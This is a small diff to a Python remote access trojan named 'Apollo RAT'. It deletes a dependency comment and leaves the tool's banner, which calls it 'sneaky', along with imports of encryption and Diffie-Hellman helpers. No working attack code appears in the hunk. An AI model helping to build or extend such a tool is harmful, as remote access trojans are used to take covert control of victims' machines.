@@ -8,8 +8,6 @@ import threading
 
 from modules.crypto import encrypt, decrypt, diffiehellman
 
-# Python dependencies: pycrypto, pycore
-
 intro = '''
 Apollo RAT - A sneaky, small Remote Access Tool written in Python
 Type Help for a list of supported commands and function.
